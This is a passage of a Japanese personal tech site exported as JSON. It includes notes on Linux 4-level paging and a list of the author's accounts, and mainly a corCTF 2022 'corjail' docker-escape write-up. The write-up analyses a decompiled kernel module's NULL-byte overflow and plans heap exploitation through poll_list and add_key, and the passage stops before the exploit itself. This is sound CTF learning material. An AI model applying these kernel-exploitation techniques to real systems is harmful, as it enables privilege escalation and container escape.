[{"body":"概要 プレイ情報 タイトル 会社 発売 プレイ時期 総プレイ時間 個人的スコア 総合スコア /10.0 中毒度 /10.0 息の長さ /10.0 本ページ中の画像・タイトル等は全て 社の著作物です。\n","categories":"","description":", ","excerpt":", ","ref":"/gaming/template/","tags":"","title":""},{"body":"Linuxの4-level paging、何かと細かいところ忘れがちですよね。\nPre-requisites ページテーブルは上位から順にPGD,PUD,PMD,PTEと呼ぶこととする。また、各テーブルに含まれているエントリのことも同じ名称で呼ぶこととするが、特にテーブル・エントリのどちらかを明示したい場合にはPGD-table/PGD-entryのように呼ぶこととする。 また、特に断りがない限りは4-level pagingに限定した話であり、5-level pagingは考えないものとする。\n基本事項あれこれ この図1の下の部分が4-level pagingの概要。図中ではPML4とか書かれているが、SDMとLinuxソースでは呼び方が異なるためPrerequisitesで定義した呼び方で呼ぶ。\n各テーブルのエントリが持つ値は、以下の感じ。図は5-levelも考慮されているが、4-levelの場合はPML5Eのことは無視。\nPMDの7th-bitが立っている場合は2MB page(huge page)として扱われ、PTEは存在せずに直接物理ページを指す。最近だと1GB pageもあるが、よく知らないしLinuxでサポートされてるかわからないので無視。\nページテーブルのページサイズ 基本的にはどのテーブルも1ページ(4KiB)2。\n// include/asm-generic/pgalloc.h static inline pgtable_t __pte_alloc_one(struct mm_struct *mm, gfp_t gfp) { struct page *pte; pte = alloc_page(gfp); // \u003c-- 1ページ分確保 if (!pte) return NULL; if (!pgtable_pte_page_ctor(pte)) { __free_page(pte); return NULL; } return pte; } 但し、KPTIが有効になっている場合にはPGDはuser/kernel用にそれぞれ1Pの、合計2ページ確保される:\n#ifdef CONFIG_PAGE_TABLE_ISOLATION #define PGD_ALLOCATION_ORDER 1 #else #define PGD_ALLOCATION_ORDER 0 #endif static inline pgd_t *_pgd_alloc(void) { return (pgd_t *)__get_free_pages(GFP_PGTABLE_USER, PGD_ALLOCATION_ORDER); } プロセス間での共有 PTEはプロセス間で共有される。対して、PGDは各プロセスが独立して持つ。 具体的には、fork時にinitプロセス3のPGDをコピーして新しいプロセスのPGDを作成する:\nstatic struct mm_struct *mm_init(struct mm_struct *mm, struct task_struct *p, struct user_namespace *user_ns) { ... if (mm_alloc_pgd(mm)) goto fail_nopgd; ... } pgd_t *pgd_alloc(struct mm_struct *mm) { pgd_t *pgd; pgd = _pgd_alloc(); ... pgd_ctor(mm, pgd); ... } static void pgd_ctor(struct mm_struct *mm, pgd_t *pgd) { if (CONFIG_PGTABLE_LEVELS == 2 || (CONFIG_PGTABLE_LEVELS == 3 \u0026\u0026 SHARED_KERNEL_PMD) || CONFIG_PGTABLE_LEVELS \u003e= 4) { clone_pgd_range(pgd + KERNEL_PGD_BOUNDARY, // \u003c-- ここ swapper_pg_dir + KERNEL_PGD_BOUNDARY, KERNEL_PGD_PTRS); } if (!SHARED_KERNEL_PMD) { pgd_set_mm(pgd, mm); pgd_list_add(pgd); } } ではPMUとPMDはどうなっているかというと、知りません。なんかコード中にSHARED_KERNEL_PMDとあるため、なんか設定できるのかもしれないけど、要検証。\nCR3とPGD CR3 register 各ページテーブルエントリは、後段のページテーブルの物理アドレスを持っている。よって、PGDのアドレスさえわかっていればそのプロセスに置いてVP変換ができる。このPGDのアドレスは、CR3レジスタが保持する:\nVP変換はMMUが勝手にやってくれて、その際にCR3のアドレスを使ってやってくれる。\nCR3とtask_struct では各プロセスごとのPGDは誰が記憶しているかと言うと、task_struct-\u003emm-\u003epgdが保持している:\nstruct mm_struct { struct { ... pgd_t * pgd; // \u003c-- PGDへのアドレスを保持 ... } ... } ここに入っているPGDの値はMMUが直接触るわけではなく、MMUはCR3の中に入っている値しか見ない。mm-\u003epgdは、kernelのコードが後段のテーブルにアクセスするために利用される。\nContext Switchとmm-\u003epgd mm-\u003epgdの値は、CR3に入らないとMMUからは見えない。mm-\u003epgdからCR3への値の代入は、context_switch()から呼ばれる関数で行われている:\nvoid switch_mm_irqs_off(struct mm_struct *prev, struct mm_struct *next, struct task_struct *tsk) { ... if (need_flush) { this_cpu_write(cpu_tlbstate.ctxs[new_asid].ctx_id, next-\u003econtext.ctx_id); this_cpu_write(cpu_tlbstate.ctxs[new_asid].tlb_gen, next_tlb_gen); load_new_mm_cr3(next-\u003epgd, new_asid, true); trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, TLB_FLUSH_ALL); } else { load_new_mm_cr3(next-\u003epgd, new_asid, false); trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, 0); } ... } xxx_tlb_flush()系の関数によって、TLB上に残っている古い変換表をクリアしている。\nKernelとPGD 読者の方もやったことがあると思うが、schedule_delayed_work()等でkthread4を作って、そのハンドラの中からcurrent-\u003emm-\u003epgdのようにPGDテーブルを参照しようとすると、ヌルポになる。それもそのはずで、kthreadは自身のmmを持っていない。clone時に、他のプロセスからmmを奪ってtask_struct-\u003eactive_mmに代入する:\nstatic int copy_mm(unsigned long clone_flags, struct task_struct *tsk) { struct mm_struct *mm, *oldmm; tsk-\u003emin_flt = tsk-\u003emaj_flt = 0; tsk-\u003envcsw = tsk-\u003enivcsw = 0; tsk-\u003emm = NULL; tsk-\u003eactive_mm = NULL; /* * Are we cloning a kernel thread? * * We need to steal a active VM for that.. */ oldmm = current-\u003emm; if (!oldmm) return 0; /* initialize the new vmacache entries */ vmacache_flush(tsk); if (clone_flags \u0026 CLONE_VM) { mmget(oldmm); mm = oldmm; } else { mm = dup_mm(tsk, current-\u003emm); if (!mm) return -ENOMEM; } tsk-\u003emm = mm; tsk-\u003eactive_mm = mm; return 0; } Misc ページテーブル辿りたい時用のsnippet貼っておこ。pxd_offset()で得られるアドレスは、テーブル自体のアドレスではなく、テーブル内のエントリのアドレスだから、注意だYO!\nulong pgd_addr = (ulong)mm-\u003epgd; pgd_t *pgd = pgd_offset(mm, vaddr); ulong pgd_val = pgd_val(*pgd); BUG_ON(pgd_none(*pgd)); pud_t *pud = pud_offset((p4d_t*)pgd, vaddr); ulong pud_val = pud_val(*pud); BUG_ON(pud_none(*pud)); pmd_t *pmd = pmd_offset(pud, vaddr); ulong pmd_val = pmd_val(*pmd); ulong pte_val = 0; if (pmd_none(*pmd)) { pte_t *pte = pte_offset_kernel(pmd, vaddr); pte_val = pte_val(*pte); } References Intel® 64 and IA-32 Architectures Software Developer’s Manual, April 2022 図は断らない限りReferencesのIntel SDMから引用 ↩︎\n特に断らない限りLinuxのコードはLinux v5.15.23 ↩︎\n昔はswapperって言ってたらしいですね。知らんけど。 ↩︎\nkthreadていう呼び方が正しいのか知らないけど、まぁ、PPIDが2(kthreadd)になる、アレです ↩︎\n","categories":"","description":"ページング周りの基本的な概要","excerpt":"ページング周りの基本的な概要","ref":"/linux/pages/4level-paging/","tags":"","title":"4-level paging"},{"body":"このセクションについて かーびぃが保有するアカウントの一覧だよ。これ以外にももちろんアカウントなんて無限に持ってるけど、かーびぃとは関係ない名前にしてるよ。だからこれ以外のアカウントでかーびぃみたいな名前があってもかーびぃじゃないよ。というか、すもーるかーびぃ自体がかーびぃの偽物だから、すもーるかーびぃの偽物は、もはやそれかーびぃだよ。\nAccount List Twitter @smallkirby: メインだよ。2021年まではこのID他の人が使ってたけど、最近取れたよ。 @smallkirby_: 大学用だよ。前はlargekirbyだったよ。 GitHub @smallkirby: ぽよぽよしてるよ。プライベートリポジトリへのコミットも草に表示されてるよ。 GitLab @smallkirby: 使ってないよ。 YouTube @user-jf4bm7sm8c: 納豆定食420円だよ。動画は公開してないよ HackMD @smallkirby: GitHub連携だよ。好きだから有料プランだよ。好きなものにはお金を払うタイプのかーびぃだよ。 はてなブログ @smallkirby: ぽよぽよしてるよ。 Google Account ssmallkirby: s1個のやつは取れなかったよ。あんまり使ってないけど、かーびぃとしてGoogle連携するときは使ってるよ。普段は全く関係ない名前のGoogleアカウント使ってるよ。探してみてね。 Discord @smallkirby#0786: フレンドリクエスト、受け付けてないよ。 Nintendo Switch 5855-3463-3894: Switchのフレコだよ。フレンドリクエストは知り合い限定だよ。子供の頃から任天堂で育ったから、Switchだけは本名を使い続けてるよ。かわいいね。 CTFTime @smallkirby: 使ってないよ Qiita @smallkirby: 使ってないよ。ぱそこんってむずかしいもんね。 GPG ADD55187E2CFF630: Gitサインのためだけにつかってるよ。でもGPGキーの管理がばがば人間だから、してないよりも厄介だよ。メインPCでしか使ってないから、Verifiedバッジがついてないcommitを見たら、今こいつベッドの上でカタカタしてるなって思ってあげてね。 Misskey.io @smallkirby: たまに使ってるよ ","categories":"","description":"かーびぃが保有するアカウント一覧","excerpt":"かーびぃが保有するアカウント一覧","ref":"/smallkirby/accounts/","tags":"","title":"Accounts"},{"body":"役に立たないRootKitの作り方。\nCamel Eyesというのは、Egan GregのPermutation Cityという小説に登場する架空のメールフィルタリングソフトウェアの名前です。因みにぼくはまだ50ページくらいしか読んでません。文句ある人はかかってきてください、全力で土下座します。\n","categories":"","description":"","excerpt":"役に立たないRootKitの作り方。\nCamel Eyesというのは、Egan GregのPermutation Cityという小説に登場す …","ref":"/cameyes/","tags":"","title":"Camel Eyes"},{"body":"","categories":"","description":"","excerpt":"","ref":"/categories/","tags":"","title":"Categories"},{"body":"","categories":"","description":"","excerpt":"","ref":"/ctf/cor-ctf/","tags":"","title":"CoRCTF"},{"body":"イントロ いちにょっき、ににょっき、さんにょっき！！こんにちは、ニートです。 最近は少しフロント周りを触っていたということで、となると反動でpwnがやりたくなる季節ですね。とはいっても今週からまた新しいインターンに行くことになっているので、様々な環境の変化に正気を保つのがギリギリな今日この頃。というわけで、今日は更に初めての経験をするべくdocker escape pwn問題を解いていきましょう。 解くのはcorCTF 2022のcorjailという問題。確か前回のエントリでもcorCTFの問題を解いた気がするのですが、このCTFの問題はかなり好きです。初めてのdocker escape問題ということで、解いてる時に詰まったところや失敗したところ等も含めて書き連ねていこうと思います。まぁ詰まったところと言ってもwriteupをカンニングしたんですけどね。ただ、これは気をつけていることと言うかpwnのwriteupを先に見る時にいつもやることですが、writeupは薄目で見るようにしています。細かいexploit内容は読まずに、keyword的なものだけピックアップして、それらをどう使うかは自分でちゃんと考えるみたいな。カンニングするにしても、最初っから全部見ちゃうとおもしろみがなくなっちゃうので。このエントリでは、色々試行錯誤したり詰まったところも含めたデバッグ風景も一緒に書いていこうと思います。\ndevenv setup まずはGitHubから問題をcloneしてきます。 配布ファイルがたくさんあるので、5分ほどuouoしましょう。 続いてbuild_kernel.shでKernelイメージをビルドします(スクリプト中だとシングルコアでビルドすることになっていて永遠に終わらないため、適宜修正しましょう)。 なんか途中でSSL周りのエラーが出るため、MODULES_SIG_ALLらへんを無効化してしまいましょう。 続いて、build_image.shでゲストファイルシステムを作成します。一応いろいろなことをしているので、evilなことをされないか自分でスクリプトの中身を見ましょう。作成されるファイルはbuild/corors/coros.qcow2です。QCOW形式のファイルは、以下の感じでmount/umountできます:\n### mount.bash #!/bin/bash set -eu MNTPOINT=/tmp/hoge QCOW=$(realpath \"${PWD}\"/../build/coros/coros.qcow2) sudo modprobe nbd max_part=8 mkdir -p $MNTPOINT sudo qemu-nbd --connect=/dev/nbd0 \"$QCOW\" sudo fdisk -l /dev/nbd0 sudo mount /dev/nbd0 $MNTPOINT ### umount.bash #!/bin/bash set -eu MNTPOINT=/tmp/hoge sudo umount $MNTPOINT || true sudo qemu-nbd --disconnect /dev/nbd0 sudo rmmod nbd さて、最初に起動フローを把握しておきます。上のスクリプトでマウントされたファイルシステムを見ると、/etc/inittabは以下の感じです。\nT0:23:respawn:/sbin/getty -L ttyS0 115200 vt100 普通ですね。続いて/etc/init.d/dockerあたりにdockerデーモンのサービススクリプトがありますが、これもまあ普通なので割愛。/etc/systemd/system/init.serviceには以下のようにサービスが登録されています:\n[Unit] Description=Initialize challenge [Service] Type=oneshot ExecStart=/usr/local/bin/init [Install] WantedBy=multi-user.target ExecStartである/usr/local/bin/initはこんな感じ:\n#!/bin/bash USER=user FLAG=$(head -n 100 /dev/urandom | sha512sum | awk '{printf $1}') useradd --create-home --shell /bin/bash $USER echo \"export PS1='\\[\\033[01;31m\\]\\u@CoROS\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# '\" \u003e\u003e /root/.bashrc echo \"export PS1='\\[\\033[01;35m\\]\\u@CoROS\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\" \u003e\u003e /home/$USER/.bashrc chmod -r 0700 /home/$USER mv /root/temp /root/$FLAG chmod 0400 /root/$FLAG 新しいユーザ(user)を作って、PS1をイかした感じにして、flagをroot onlyにしているくらいです。続いて、/etc/passwdはこんな感じ:\nroot:x:0:0:root:/root:/usr/local/bin/jail daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (snipped...) rootのログインシェルが/usr/local/bin/jailになっています:\n#!/bin/bash echo -e '[\\033[5m\\e[1;33m!\\e[0m] Spawning a shell in a CoRJail...' /usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer /usr/sbin/poweroff -f userとしてdockerを起動したあと、poweroffをしていますね。ここがメインの処理みたいです。--security-opt seccomp=/etc/docker/corjail.jsonを指定していますが、seccomp filterの内容は後ほど見ていくことにします。/proc/cormonという謎のproc fsもバインドマウントしていますが、これも後ほど見ていくことにします。 というわけで、ゲストOSのroot(not on docker)を触りたいときには、/etc/passwdのログインシェルを/bin/bashあたりにしておけばいいことがわかりました。rootでdocker imagesしてみると、以下の感じ:\nroot@CoROS:~# docker images REPOSITORY TAG IMAGE ID CREATED SIZE corcontainer latest 8279763e02ce 2 months ago 84.7MB debian bullseye-slim c9cb6c086ef7 3 months ago 80.4MB 先程jailの中でも指定されていたcorcontainerがありますね。これはどうやってつくられたのでしょう。build_image.shを見てみると、以下の記述があります:\ntar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker cp -rp coros/files/docker/var/lib/docker $FS/var/lib/ rm -rf coros/files/docker/var Docker imageは予め作られたものを使っているようです。デバッグ時には常に最新のexploitをguest OSのdockerコンテナ上に置いておきたいので、/usr/local/bin/jailを以下のように変更しておきましょう:\n#!/bin/bash echo -e '[\\033[5m\\e[1;33m!\\e[0m] Spawning a shell in a CoRJail...' cp /exploit /home/user || echo \"[!] exploit not found, skipping\" chown -R user:user /home/user echo 0 \u003e /proc/sys/kernel/kptr_restrict /usr/bin/docker run -it --user root \\ --hostname CoRJail \\ --security-opt seccomp=/etc/docker/corjail.json \\ --add-cap CAP_SYSLOG \\ -v /proc/cormon:/proc_rw/cormon:rw \\ -v /home/user/:/home/user/host \\ corcontainer /usr/sbin/poweroff -f あとはexploitをguestのファイルシステムにおいておけば、勝手にコンテナ内の/home/user/exploitに配置されて便利ですね。ついでにCAP_SYSLOGを与えることで/proc/kallsysmを見れるようにしています。 因みに諸々のめんどくさいことは、lysitheaが全部面倒見てくれるので、最初のセットアップを除くと実際には以下のコマンドを打つだけです:\nlysithea init # first time only lysithea extract # first time only lysithea local static analysis misc lysithea曰く:\nroot@CoRJail:/home/user/host# ./drothea --verbose Drothea v1.0.0 [.] kernel version: Linux version 5.10.127 (root@VPS) (gcc (Debian 8.3.0-6) 8.3.0, GNU ld (GNU Binutils for Debian) 2.31.1) #2 SMP Thu January 1 00:00:00 UTC 2030 [-] CONFIG_KALLSYMS_ALL is enabled. [!] unprivileged ebpf installation is enabled. cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory [-] unprivileged userfaultfd is disabled. [?] KASLR seems enabled. Should turn off for debug purpose. [?] kptr seems restricted. Should try 'echo 0 \u003e /proc/sys/kernel/kptr_restrict' in init script. root@CoRJail:/home/user/host# ./ingrid --verbose Ingrid v1.0.0 [-] userfualtfd is disabled. [-] CONFIG_DEVMEM is disabled. 基本的セキュリティ機構は全部有効です。さて、kernelのビルドスクリプト(build_kernel.shを読むと、以下のようなパッチがあたっています:\ndiff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c --- a/arch/x86/entry/syscall_64.c\t2022-06-29 08:59:54.000000000 +0200 +++ b/arch/x86/entry/syscall_64.c\t2022-07-02 12:34:11.237778657 +0200 @@ -17,6 +17,9 @@ #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym, +DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count); +EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count); + asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = { /* * Smells like a compiler bug -- it doesn't work diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h --- a/arch/x86/include/asm/syscall_wrapper.h\t2022-06-29 08:59:54.000000000 +0200 +++ b/arch/x86/include/asm/syscall_wrapper.h\t2022-07-02 12:34:11.237778657 +0200 @@ -219,9 +220,41 @@ #define SYSCALL_DEFINE_MAXARGS\t6 -#define SYSCALL_DEFINEx(x, sname, ...)\t\\ -\tSYSCALL_METADATA(sname, x, __VA_ARGS__)\t\\ -\t__SYSCALL_DEFINEx(x, sname, __VA_ARGS__) +DECLARE_PER_CPU(u64[], __per_cpu_syscall_count); + +#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \\ +\tstatic inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__)); + +#define __SYSCALL_COUNT(syscall_nr) \\ +\tthis_cpu_inc(__per_cpu_syscall_count[(syscall_nr)]) + +#define SYSCALL_COUNT_FUNCx(sname, x, ...)\t\\ +\t{\t\\ +\t__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);\t\\ +\treturn __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));\t\\ +\t}\t\\ +\tstatic inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__)) + +#define SYSCALL_COUNT_DECLARE0(sname) \\ +\tstatic inline long __count_sys_##sname(void); + +#define SYSCALL_COUNT_FUNC0(sname)\t\\ +\t{\t\\ +\t__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);\t\\ +\treturn __count_sys_##sname();\t\\ +\t}\t\\ +\tstatic inline long __count_sys_##sname(void) + +#define SYSCALL_DEFINEx(x, sname, ...)\t\\ +\tSYSCALL_METADATA(sname, x, __VA_ARGS__)\t\\ +\tSYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)\t\\ +\t__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)\t\\ +\tSYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__) + +#define SYSCALL_DEFINE0(sname)\t\\ +\tSYSCALL_COUNT_DECLARE0(sname)\t\\ +\t__SYSCALL_DEFINE0(sname)\t\\ +\tSYSCALL_COUNT_FUNC0(sname) (snpped...) これはprocfsにsyscallのanalyticsを追加するパッチみたいです。パッチからもわかるように、各CPUに__per_cpu_syscall_countという変数が追加され、syscallの呼び出し回数を記録するようになっています。\nmodule analysis (rev) 続いて、本問題のメインであるカーネルモジュール(cormon.ko)を見ていきます。そして気づく、ソースコードが配布されてない！！！きっとおっちょこちょいでソースを配布し忘れてしまったんでしょう。仕方がないのでGhidraで見ていきましょう。デコンパイルして適当に見やすく整形するとこんな感じ:\nchar *initial_filter = \"sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare\"; struct proc_ops cormon_proc_ops = { .proc_open = cormon_proc_open, .proc_write = cormon_proc_write, .proc_read = seq_read, }; struct seq_operations cormon_seq_ops = { .start = cormon_seq_start, .stop = cormon_seq_stop, .next = cormon_seq_next, .show = cormon_seq_show, }; int init_module(void) { printk(\"6[CoRMon::Init] Initializing module...\\n\"); if (proc_create(\"cormon\", 0x1B5, 0, cormon_proc_ops) != 0) { return -0xC; } if (update_filter(initial_filter) != 0) { return -0x16; } printk(\"3[CoRMon::Error] proc_create() call failed!\\n\"); return 0; } void cormon_proc_open(struct *inode inode, struct file *fp) { seq_open(fp, cormon_seq_ops); return; } ssize_t cormon_proc_write(struct file *fp, const char __user *ubuf, size_t size, loff_t *offset) { size_t sz; char *heap; if (*offset \u003c 0) return 0xffffffffffffffea; if (*offset \u003c 0x1000 \u0026\u0026 size != 0) { if (0x1000 \u003c size) sz = 0xFFF; heap = kmem_cache_alloc_trace(?, 0xA20, 0x1000); printk(\"6[CoRMon::Debug] Syscalls @ %#llx\\n\"); if (heap == NULL) { printk(\"3[CoRMon::Error] kmalloc() call failed!\\n\"); return 0xfffffffffffffff4; } if (copy_from_user(heap, ubuf, sz) != 0) { printk(\"3[CoRMon::Error] copy_from_user() call failed!\\n\"); return 0xfffffffffffffff2; } heap[sz] = NULL; if (update_filter(heap)) { kfree(heap); } else { kfree(heap); return 0xffffffffffffffea; } } return 0; } long update_filter(char *syscall_str) { char *syscall; int syscall_nr; char syscall_list[?] = {0}; while(syscall = strsep(syscall, \",\") \u0026\u0026 syscall != NULL \u0026\u0026 syscall_str != NULL) { if((syscall_nr = get_syscall_nr(syscall)) \u003c 0) { printk(\"3[CoRMon::Error] Invalid syscall: %s!\\n\", syscall); return 0xffffffea; } syscall_list[syscall_nr] = 1; } memcpy(filter, syscall_list, 0x37 * 8); } int cormon_seq_show(struct seq_file *sfp, void *vp) { ulong v = *vp; if (v == 0) { int n = -1; seq_putc(sfp, 0xA); while((n = cpumask_next(n, \u0026__cpu_online_mask)) \u003c _nr_cpu_ids) { // for_each_cpu macro? seq_printf(sfp, \"%9s%d\", \"CPU\", n); } seq_printf(sfp, \"\\tSyscall (NR)\\n\\n\"); } if (filtter[v] != 0) { if((name = get_syscall_name(v)) == 0) return 0; int n = -1; while((n = cpumask_next(n, \u0026__cpu_online_mask)) \u003c _nr_cpu_ids) { seq_printf(sfp, \"%10sllu\", \"CPU\", __per_cpu_syscall_count[v]); // PER_CPU macro? } seq_printf(sfp, \"\\t%s (%lld)\\n\", name, v); } if (v == 0x1B9) seq_putc(sfp, 0xA); return 0; } void* cormon_seq_next(struct seq_file *fp, void *v, loff_t *pos_p) { loff_t pos = *pos_p; *pos_p++; if (pos \u003c 0x1BA) return pos_p; return 0; } void* cormon_seq_stop(struct seq_file *fp, void *v) { return NULL; } void* cormon_seq_start(struct seq_file *fp, loff_t *pos_p) { if (*pos_p \u003c 0x1BA) return pos_p; else return 0; } まぁ内容は簡単なのでrev自体はそんなに難しくないです。 やっていることとしては、上述のpatchによって導入されたPERCPUな変数__per_cpu_syscall_countを表示するインタフェースを作っています。このカウンタはpatchされたsyscallの先頭において__SYSCALL_COUNT()でインクリメントされます。このインクリメントは、モジュール内のfilterには関係なく全てのsyscallに対して行われます。cormonモジュールは、procに生やしたファイルをreadすることでfilterが有効になっているsyscallの統計結果だけを表示しているようにしており、また書き込みを行うことでfilterの値を更新することができるように成っています。update_filter()を見るとわかるように、更新方法は/proc_rw/cormonにsyscallの名前をカンマ区切りで書き込みます(Dockerの起動時に-v /proc/cormon:/proc_rw/cormon:rwとしてホストのデバイスファイルをゲストにRWでバインドマウントしています)。 実際に使ってみるとこんな感じ:\nseccomp seccomp.json(のちにcorjail.jsonとしてVM内にコピーされる)には、以下のようにdefaultAction: SCMP_ACT_ERRNOでフィルターが設定されています:\n{ \"defaultAction\": \"SCMP_ACT_ERRNO\", \"defaultErrnoRet\": 1, \"syscalls\": [ { \"names\": [ \"_llseek\", \"_newselect\", (snipped...)], \"action\": \"SCMP_ACT_ALLOW\" }, { \"names\": [ \"clone\" ], \"action\": \"SCMP_ACT_ALLOW\", \"args\": [ { \"index\": 0, \"value\": 2114060288, \"op\": \"SCMP_CMP_MASKED_EQ\" } ] } ] } 許可されていないsyscallは、おおよそ以下のとおりです(雑に比較したので多少ずれはあるかも):\nmsgget msgsnd msgrcv msgctl ptrace syslog uselib personality ustat sysfs vhangup pivot_root _sysctl chroot acct settimeofday mount umount2 swapon swapoff reboot sethostname setdomainname iopl ioperm create_module init_module delete_module get_kernel_syms query_module quotactl nfsservctl getpmsg putpmsg afs_syscall tuxcall security lookup_dcookie clock_settime vserver mbind set_mempolicy get_mempolicy mq_open mq_unlink mq_timedsend mq_timedreceive mq_notify mq_getsetattr kexec_load request_key migrate_pages unshare move_pages perf_event_open fanotify_init name_to_handle_at open_by_handle_at setns process_vm_readv process_vm_writev kcmp finit_module kexec_file_load bpf userfaultfd pkey_mprotect pkey_alloc pkey_free unshare, mount, msgget, msgsnd, userfaultfd, bpfらへんが禁止されていますね。\nちなみに、Ubuntu22.04環境でpthreadを含めてstatic buildしたバイナリをコンテナ上で動かそうとしたところ、Operation not permittedになりました。Dockerには多分seccompでひっかかったsyscallのレポート機能がないため、手動と勘で問題になっているsyscallを探したところ、clone3 syscallが問題になっているようでした。よって、seccomp.jsonに以下のようなパッチを当てました(writeupを見た感じ、pthreadの使用は意図しているため、pthreadを含む環境の違いっぽい?):\n--- a/../build/coros/files/docker/seccomp.json +++ b/./seccomp.json @@ -10,6 +10,10 @@ \"names\": [ \"clone\" ], \"action\": \"SCMP_ACT_ALLOW\", \"args\": [ { \"index\": 0, \"value\": 2114060288, \"op\": \"SCMP_CMP_MASKED_EQ\" } ] + }, + { + \"names\": [ \"clone3\" ], + \"action\": \"SCMP_ACT_ALLOW\" } ] } Vuln: NULL-byte overflow バグはGhidraのデコンパイル結果を見ると明らかです。 common_proc_write()ではユーザから渡されたsyscallの文字列をheap(kmalloc-4k)にコピーしています。その後、heapの最後をNULL終端しようとしていますが、sizeが0x1000の時にNULL-byte overflowするようになっています:\ncommon_proc_write() { if (0x1000 \u003c size) sz = 0xFFF; if (copy_from_user(heap, ubuf, sz) != 0) {...} ... heap[sz] = NULL; ... } 使われるスラブキャッシュはkmalloc-4kです。コレとかを見ると、まぁ使えそうな構造体はあるように思えますが、今回はseccompでフィルターされているため1K以上のキャッシュで使える構造体はこのリストには見当たりません。最近のkernelpwn追ってないしここでお手上げに成ったので、writeupをカンニングしました、チート最高！\npre-requisites sys_poll sys_poll()が使えるらしい。ソースはこんな感じ(余計なところは省略している):\n#define FRONTEND_STACK_ALLOC\t256 #define POLL_STACK_ALLOC\tFRONTEND_STACK_ALLOC #define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list)) / \\ sizeof(struct pollfd)) #define POLLFD_PER_PAGE ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd)) struct pollfd { int fd; short events; short revents; }; /* size: 8, cachelines: 1, members: 3 */ struct poll_list { struct poll_list *next; int len; struct pollfd entries[]; }; /* size: 16, cachelines: 1, members: 3 */ static int do_sys_poll(struct pollfd __user *ufds, unsigned int nfds, struct timespec64 *end_time) { struct poll_wqueues table; long stack_pps[POLL_STACK_ALLOC/sizeof(long)]; struct poll_list *const head = (struct poll_list *)stack_pps; struct poll_list *walk = head; len = min_t(unsigned int, nfds, N_STACK_PPS); for (;;) { walk-\u003enext = NULL; walk-\u003elen = len; if (!len) break; if (copy_from_user(walk-\u003eentries, ufds + nfds-todo, sizeof(struct pollfd) * walk-\u003elen)) goto out_fds; todo -= walk-\u003elen; if (!todo) break; len = min(todo, POLLFD_PER_PAGE); walk = walk-\u003enext = kmalloc(struct_size(walk, entries, len), GFP_KERNEL); if (!walk) { err = -ENOMEM; goto out_fds; } } fdcount = do_poll(head, \u0026table, end_time); err = fdcount; out_fds: walk = head-\u003enext; while (walk) { struct poll_list *pos = walk; walk = walk-\u003enext; kfree(pos); } return err; } まずユーザランドから渡されたpollfdリストをスタック上のstack_ppsに最大256byte分コピーします。厳密には、next, lenメンバ分の16byteを除いた240byte分(つまりstruct pollfdの30個分)をスタック上にコピーします。もしそれ以上のufdsが渡された場合には、次は最大でPOLLFD_PER_PAGE ((4096-16)/8 == 510)個数分だけkmalloc()してコピーします。つまり、使われるスラブキャッシュはkmalloc-32 ~ kmalloc-4kのどれか(next, lenの分があるためkmalloc-16以下には入らない)です。こうして、256byteのstackと、32~4Kのheapにstruct poll_listとpollfdをコピーしたあと、それらをnextポインタで繋いでリストを作っています。freeは、リストの先頭から順にkfreeで単純に解放してます。 なるほど、たしかにこの構造体はkmalloc-32~4kの任意のサイズのキャッシュへのポインタを持つことができて、且つfreeはタイマーでも任意のタイミングでもできるため便利そう。 前述のNULL-byte overflowを使ってstruct pollfdのnextをpartial overwriteすることで、そのスラブに入っているオブジェクトをUAF(read)できそうです。問題は、msgXXX系のsyscallがフィルターされている状況で、どの構造体を使ってreadするか。\nadd_key / keyctl syscall まぁ勿論カンニングしたんですが。add_keyというシステムコールがあるらしい。知らんがな。そういえば、seccompのフィルターを見るとデフォルトの設定では許可されていないのにこの問題では許可されています。ソースはこんな感じ:\n// security/keys/user_defined.c struct key_type key_type_user = { .name\t= \"user\", .preparse\t= user_preparse, .free_preparse\t= user_free_preparse, .instantiate\t= generic_key_instantiate, .update\t= user_update, .revoke\t= user_revoke, .destroy\t= user_destroy, .describe\t= user_describe, .read\t= user_read, }; int user_preparse(struct key_preparsed_payload *prep) { struct user_key_payload *upayload; size_t datalen = prep-\u003edatalen; if (datalen \u003c= 0 || datalen \u003e 32767 || !prep-\u003edata) return -EINVAL; upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL); ... } // security/keys/keyctl.c SYSCALL_DEFINE5(add_key, const char __user *, _type, const char __user *, _description, const void __user *, _payload, size_t, plen, key_serial_t, ringid) { key_ref_t keyring_ref, key_ref; char type[32], *description; void *payload; long ret; /* draw all the data into kernel space */ ret = key_get_type_from_user(type, _type, sizeof(type)); description = NULL; if (_description) {...} /* pull the payload in if one was supplied */ payload = NULL; if (plen) { ... if (copy_from_user(payload, _payload, plen) != 0) goto error3; } keyring_ref = lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE); key_ref = key_create_or_update(keyring_ref, type, 